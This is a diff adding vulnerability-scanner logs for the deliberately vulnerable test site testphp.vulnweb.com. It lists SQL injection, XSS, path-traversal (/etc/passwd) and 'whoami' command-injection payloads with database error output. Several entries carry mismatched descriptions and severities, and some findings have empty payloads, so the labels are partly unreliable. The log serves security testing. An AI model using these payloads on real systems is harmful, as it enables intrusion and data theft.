+  Payload: 1'+OR+SLEEP(10)--
+  Type: Time-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+  Time-based Verified: Yes
+  Severity: critical
+  Description: Detects Broken Access Control vulnerabilities by attempting to access restricted resources.
+  Reference: https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control
+  Author: nghia
+  Tags: bac, access-control
+- Endpoint: http://testphp.vulnweb.com/search.php?test=<script>alert('xss')</script>
+  Payload: <script>alert('xss')</script>
+  Type: XSS
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'xss')</script>'' at line 1
+  Severity: low
+  Description: Detects Broken Access Control vulnerabilities by attempting to access restricted resources.
+  Reference: https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control
+  Author: nghia
+  Tags: bac, access-control
+- Endpoint: http://testphp.vulnweb.com/listproducts.php?cat=1'+OR+SLEEP(10)--
+  Payload: 1'+OR+SLEEP(10)--
+  Type: Time-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' OR SLEEP(10)--' at line 1
+  Time-based Verified: Yes
+  Severity: critical
+  Description: Detects Broken Access Control vulnerabilities by attempting to access restricted resources.
+  Reference: https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control
+  Author: nghia
+  Tags: bac, access-control
+- Endpoint: http://testphp.vulnweb.com/update_profile.php
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Broken Access Control vulnerabilities by attempting to access restricted resources.
+  Reference: https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control
+  Author: nghia
+  Tags: bac, access-control
+- Endpoint: http://testphp.vulnweb.com/profile.php?user_id=106
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Broken Access Control vulnerabilities by attempting to access restricted resources.
+  Reference: https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control
+  Author: nghia
+  Tags: bac, access-control
+- Endpoint: http://testphp.vulnweb.com/api/user_info
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Broken Access Control vulnerabilities by attempting to access restricted resources.
+  Reference: https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control
+  Author: nghia
+  Tags: bac, access-control
+- Endpoint: http://testphp.vulnweb.com/search.php?test=<svg+onload=alert('xss')>
+  Payload: <svg+onload=alert('xss')>
+  Type: XSS
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'xss')>'' at line 1
+  Severity: low
+  Description: Detects Broken Access Control vulnerabilities by attempting to access restricted resources.
+  Reference: https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control
+  Author: nghia
+  Tags: bac, access-control
+- Endpoint: http://testphp.vulnweb.com/index.php?file=../../../../etc/passwd
+  Payload: ../../../../etc/passwd
+  Type: LFI
+  Verified: No
+  Severity: medium
+  Description: Detects Broken Access Control vulnerabilities by attempting to access restricted resources.
+  Reference: https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control
+  Author: nghia
+  Tags: bac, access-control
+- Endpoint: http://testphp.vulnweb.com/artists.php?artist=1'+OR+SLEEP(10)--
+  Payload: 1'+OR+SLEEP(10)--
+  Type: Time-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' OR SLEEP(10)--' at line 1
+  Time-based Verified: Yes
+  Severity: critical
+  Description: Detects Broken Access Control vulnerabilities by attempting to access restricted resources.
+  Reference: https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control
+  Author: nghia
+  Tags: bac, access-control
+- Endpoint: http://testphp.vulnweb.com/search.php?test=<img+src=x+onerror=alert('xss')>
+  Payload: <img+src=x+onerror=alert('xss')>
+  Type: XSS
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'xss')>'' at line 1
+  Severity: low
+  Description: Detects Broken Access Control vulnerabilities by attempting to access restricted resources.
+  Reference: https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control
+  Author: nghia
+  Tags: bac, access-control
+- Endpoint: http://testphp.vulnweb.com/listproducts.php?cat=1'+UNION+SELECT+1,2,3--
+  Payload: 1'+UNION+SELECT+1,2,3--
+  Type: Union-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT 1,2,3--' at line 1
+  Severity: low
+  Description: Detects Broken Access Control vulnerabilities by attempting to access restricted resources.
+  Reference: https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control
+  Author: nghia
+  Tags: bac, access-control
+- Endpoint: http://testphp.vulnweb.com/index.php?cmd=whoami
+  Payload: whoami
+  Type: RCE
+  Verified: Yes
+  Severity: critical
+  Description: Detects Broken Access Control vulnerabilities by attempting to access restricted resources.
+  Reference: https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control
+  Author: nghia
+  Tags: bac, access-control
+- Endpoint: http://testphp.vulnweb.com/index.php?file=whoami
+  Payload: whoami
+  Type: RCE
+  Verified: Yes
+  Severity: critical
+  Description: Detects Broken Access Control vulnerabilities by attempting to access restricted resources.
+  Reference: https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control
+  Author: nghia
+  Tags: bac, access-control
+- Endpoint: http://testphp.vulnweb.com/index.php?cmd=../../../../etc/passwd
+  Payload: ../../../../etc/passwd
+  Type: LFI
+  Verified: No
+  Severity: medium
+  Description: Detects Broken Access Control vulnerabilities by attempting to access restricted resources.
+  Reference: https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control
+  Author: nghia
+  Tags: bac, access-control
+- Endpoint: http://testphp.vulnweb.com/search.php?test=1'+UNION+SELECT+1,2,3--
+  Payload: 1'+UNION+SELECT+1,2,3--
+  Type: Union-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+  Severity: low
+  Description: Detects Broken Access Control vulnerabilities by attempting to access restricted resources.
+  Reference: https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control
+  Author: nghia
+  Tags: bac, access-control
+- Endpoint: http://testphp.vulnweb.com/admin/dashboard.php
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Broken Access Control vulnerabilities by attempting to access restricted resources.
+  Reference: https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control
+  Author: nghia
+  Tags: bac, access-control
+- Endpoint: http://testphp.vulnweb.com/search.php?test=1'+AND+1=2--
+  Payload: 1'+AND+1=2--
+  Type: Boolean-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+  Boolean-based Verified: Yes
+  Severity: high
+  Description: Detects Broken Access Control vulnerabilities by attempting to access restricted resources.
+  Reference: https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control
+  Author: nghia
+  Tags: bac, access-control
+- Endpoint: http://testphp.vulnweb.com/transfer_funds.php
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Broken Access Control vulnerabilities by attempting to access restricted resources.
+  Reference: https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control
+  Author: nghia
+  Tags: bac, access-control
+- Endpoint: http://testphp.vulnweb.com/listproducts.php?cat=1'+AND+1=1--
+  Payload: 1'+AND+1=1--
+  Type: Boolean-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND 1=1--' at line 1
+  Boolean-based Verified: Yes
+  Severity: high
+  Description: Detects Broken Access Control vulnerabilities by attempting to access restricted resources.
+  Reference: https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control
+  Author: nghia
+  Tags: bac, access-control
+- Endpoint: http://testphp.vulnweb.com/artists.php?artist=1'+AND+1=2--
+  Payload: 1'+AND+1=2--
+  Type: Boolean-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND 1=2--' at line 1
+  Boolean-based Verified: Yes
+  Severity: high
+  Description: Detects Broken Access Control vulnerabilities by attempting to access restricted resources.
+  Reference: https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control
+  Author: nghia
+  Tags: bac, access-control
+- Endpoint: http://testphp.vulnweb.com/artists.php?artist=1'+AND+1=1--
+  Payload: 1'+AND+1=1--
+  Type: Boolean-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND 1=1--' at line 1
+  Boolean-based Verified: Yes
+  Severity: high
+  Description: Detects Broken Access Control vulnerabilities by attempting to access restricted resources.
+  Reference: https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control
+  Author: nghia
+  Tags: bac, access-control
+- Endpoint: http://testphp.vulnweb.com/search.php?test=1'+AND+1=1--
+  Payload: 1'+AND+1=1--
+  Type: Boolean-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+  Boolean-based Verified: Yes
+  Severity: high
+  Description: Detects Broken Access Control vulnerabilities by attempting to access restricted resources.
+  Reference: https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control
+  Author: nghia
+  Tags: bac, access-control
+- Endpoint: http://testphp.vulnweb.com/artists.php?artist=1'+UNION+SELECT+1,2,3--
+  Payload: 1'+UNION+SELECT+1,2,3--
+  Type: Union-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT 1,2,3--' at line 1
+  Severity: low
+  Description: Detects Broken Access Control vulnerabilities by attempting to access restricted resources.
+  Reference: https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control
+  Author: nghia
+  Tags: bac, access-control
+- Endpoint: http://testphp.vulnweb.com/listproducts.php?cat=1'+AND+1=2--
+  Payload: 1'+AND+1=2--
+  Type: Boolean-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND 1=2--' at line 1
+  Boolean-based Verified: Yes
+  Severity: high
+  Description: Detects Broken Access Control vulnerabilities by attempting to access restricted resources.
+  Reference: https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control
+  Author: nghia
+  Tags: bac, access-control
+- Endpoint: http://testphp.vulnweb.com/account_details.php?account_id=930
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Broken Access Control vulnerabilities by attempting to access restricted resources.
+  Reference: https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control
+  Author: nghia
+  Tags: bac, access-control
+- Endpoint: http://testphp.vulnweb.com/error.php?debug=true
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Broken Access Control vulnerabilities by attempting to access restricted resources.
+  Reference: https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control
+  Author: nghia
+  Tags: bac, access-control
+- Endpoint: http://testphp.vulnweb.com/manage_users.php
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Broken Access Control vulnerabilities by attempting to access restricted resources.
+  Reference: https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control
+  Author: nghia
+  Tags: bac, access-control
+
+Timestamp: 2025-05-30 15:01:15
+Target: http://testphp.vulnweb.com/
+Template: lfi-rce-detection.yaml
+Vulnerabilities Found:
+- Endpoint: http://testphp.vulnweb.com/index.php?file=whoami
+  Payload: whoami
+  Type: RCE
+  Verified: Yes
+  Severity: critical
+  Description: Detects Local File Inclusion (LFI) and Remote Code Execution (RCE) vulnerabilities.
+  Reference: https://owasp.org/www-community/attacks/Local_File_Inclusion, https://owasp.org/www-community/attacks/Remote_Code_Execution
+  Author: nghia
+  Tags: lfi, rce, injection
+- Endpoint: http://testphp.vulnweb.com/index.php?cmd=whoami
+  Payload: whoami
+  Type: RCE
+  Verified: Yes
+  Severity: critical
+  Description: Detects Local File Inclusion (LFI) and Remote Code Execution (RCE) vulnerabilities.
+  Reference: https://owasp.org/www-community/attacks/Local_File_Inclusion, https://owasp.org/www-community/attacks/Remote_Code_Execution
+  Author: nghia
+  Tags: lfi, rce, injection
+- Endpoint: http://testphp.vulnweb.com/index.php?file=../../../../etc/passwd
+  Payload: ../../../../etc/passwd
+  Type: LFI
+  Verified: No
+  Severity: medium
+  Description: Detects Local File Inclusion (LFI) and Remote Code Execution (RCE) vulnerabilities.
+  Reference: https://owasp.org/www-community/attacks/Local_File_Inclusion, https://owasp.org/www-community/attacks/Remote_Code_Execution
+  Author: nghia
+  Tags: lfi, rce, injection
+- Endpoint: http://testphp.vulnweb.com/index.php?cmd=../../../../etc/passwd
+  Payload: ../../../../etc/passwd
+  Type: LFI
+  Verified: No
+  Severity: medium
+  Description: Detects Local File Inclusion (LFI) and Remote Code Execution (RCE) vulnerabilities.
+  Reference: https://owasp.org/www-community/attacks/Local_File_Inclusion, https://owasp.org/www-community/attacks/Remote_Code_Execution
+  Author: nghia
+  Tags: lfi, rce, injection
+
+Timestamp: 2025-05-30 16:13:19
+Target: http://testphp.vulnweb.com/
+Template: lfi-rce-detection.yaml
+Vulnerabilities Found:
+- Endpoint: http://testphp.vulnweb.com/index.php?file=../../../../etc/passwd
+  Payload: ../../../../etc/passwd
+  Type: LFI
+  Verified: No
+  Severity: medium
+  Description: Detects Local File Inclusion (LFI) and Remote Code Execution (RCE) vulnerabilities.
+  Reference: https://owasp.org/www-community/attacks/Local_File_Inclusion, https://owasp.org/www-community/attacks/Remote_Code_Execution
+  Author: nghia
+  Tags: lfi, rce, injection
+- Endpoint: http://testphp.vulnweb.com/index.php?cmd=whoami
+  Payload: whoami
+  Type: RCE
+  Verified: Yes
+  Severity: critical
+  Description: Detects Local File Inclusion (LFI) and Remote Code Execution (RCE) vulnerabilities.
+  Reference: https://owasp.org/www-community/attacks/Local_File_Inclusion, https://owasp.org/www-community/attacks/Remote_Code_Execution
+  Author: nghia
+  Tags: lfi, rce, injection
+- Endpoint: http://testphp.vulnweb.com/index.php?cmd=../../../../etc/passwd
+  Payload: ../../../../etc/passwd
+  Type: LFI
+  Verified: No
+  Severity: medium
+  Description: Detects Local File Inclusion (LFI) and Remote Code Execution (RCE) vulnerabilities.
+  Reference: https://owasp.org/www-community/attacks/Local_File_Inclusion, https://owasp.org/www-community/attacks/Remote_Code_Execution
+  Author: nghia
+  Tags: lfi, rce, injection
+- Endpoint: http://testphp.vulnweb.com/index.php?file=whoami
+  Payload: whoami
+  Type: RCE
+  Verified: Yes
+  Severity: critical
+  Description: Detects Local File Inclusion (LFI) and Remote Code Execution (RCE) vulnerabilities.
+  Reference: https://owasp.org/www-community/attacks/Local_File_Inclusion, https://owasp.org/www-community/attacks/Remote_Code_Execution
+  Author: nghia
+  Tags: lfi, rce, injection
+
